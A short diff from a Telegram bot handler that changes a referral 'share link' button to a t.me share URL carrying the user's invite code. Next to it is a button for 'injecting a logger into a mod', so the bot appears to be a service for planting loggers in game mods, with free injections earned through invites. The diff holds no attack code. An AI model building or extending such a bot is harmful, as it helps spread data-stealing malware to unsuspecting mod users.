@@ -668,7 +668,7 @@ async def free_inject_info(callback: CallbackQuery):
         f"{text}",
         reply_markup=InlineKeyboardMarkup(
             inline_keyboard=[
-                [InlineKeyboardButton(text="🔗 Поделиться ссылкой", switch_inline_query=user.get("invite_code"))],
+                [InlineKeyboardButton(text="🔗 Поделиться ссылкой", url=f"https://t.me/share/url?url=https://t.me/{BOT_USERNAME}?start={user.get('invite_code')}")],
                 [InlineKeyboardButton(text="🎮 Вшить логгер в мод", callback_data="inject_start")],
             ]
         ),
